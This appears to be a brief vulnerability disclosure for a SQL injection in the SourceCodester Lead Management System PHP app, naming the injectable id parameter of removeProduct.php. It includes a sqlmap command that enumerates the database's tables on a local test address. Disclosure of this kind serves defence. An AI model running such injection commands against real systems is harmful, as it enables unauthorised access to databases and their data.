vendor：https://www.sourcecodester.com/

download link：https://www.sourcecodester.com/php/15933/lead-management-system-php-open-source-free-download.html

Vulnerability trigger parameter: $id

The process of vulnerability discovery is as follows：

![image](https://user-images.githubusercontent.com/30823782/208411420-ff6c6102-bfef-4ff2-bc4a-74318dcf7388.png)


EXP:

```
sqlmap.py -u "http://192.168.31.50/penglead/php_action/removeProduct.php?id=1" --dbms=mysql -D penglead --tables
```
![image](https://user-images.githubusercontent.com/30823782/208411453-8812c2b2-82a1-4c23-b5b3-bf19bfb91aec.png)

